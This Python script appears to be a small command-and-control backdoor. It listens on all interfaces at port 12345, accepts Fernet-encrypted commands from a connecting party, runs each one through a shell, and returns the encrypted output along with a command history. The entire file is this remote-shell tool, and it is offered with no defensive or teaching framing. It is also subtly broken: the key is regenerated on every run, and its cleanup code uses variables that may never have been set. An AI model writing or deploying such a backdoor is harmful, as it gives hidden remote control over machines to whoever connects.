import socket
import subprocess
import logging
import time
from cryptography.fernet import Fernet

# Configure the logging module
logging.basicConfig(filename='c2_server.log', level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')

# Generate a symmetric key for encryption (you should securely distribute this key to the client)
symmetric_key = Fernet.generate_key()
cipher_suite = Fernet(symmetric_key)

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Define the host and port to bind to
host = '0.0.0.0'  # Listen on all available network interfaces
port = 12345  # Choose a port number

try:
    # Bind the socket to the host and port
    server_socket.bind((host, port))

    # Listen for incoming connections
    server_socket.listen(5)  # Number of queued connections

    logging.info(f"Server listening on {host}:{port}")

    # Accept incoming connections
    client_socket, client_address = server_socket.accept()

    logging.info(f"Accepted connection from {client_address}")
    connection_start_time = time.time()  # Record the connection start time
    command_history = []  # Store command history

    while True:
        # Receive an encrypted command from the client
        encrypted_command = client_socket.recv(1024)
        if not encrypted_command:
            break

        # Decrypt the command using the symmetric key
        command = cipher_suite.decrypt(encrypted_command).decode('utf-8')

        if command.lower() == 'exit':
            # Exit the loop and close the connection
            break
        elif command.lower() == 'history':
            # Send the command history to the client
            history_output = "\n".join(command_history)
            encrypted_history_output = cipher_suite.encrypt(history_output.encode('utf-8'))
            client_socket.send(encrypted_history_output)
        else:
            # Execute the command and send the encrypted output back to the client
            output = run_command(command)
            command_history.append(command)
            
            # Encrypt the output before sending
            encrypted_output = cipher_suite.encrypt(output.encode('utf-8'))
            client_socket.send(encrypted_output)

except socket.error as e:
    logging.error(f"Socket error: {e}")
except Exception as e:
    logging.error(f"Error: {e}")

finally:
    # Calculate the connection duration and log it
    connection_duration = time.time() - connection_start_time
    logging.info(f"Connection from {client_address} closed. Duration: {connection_duration:.2f} seconds")

    # Close the sockets when done
    client_socket.close()
    server_socket.close()

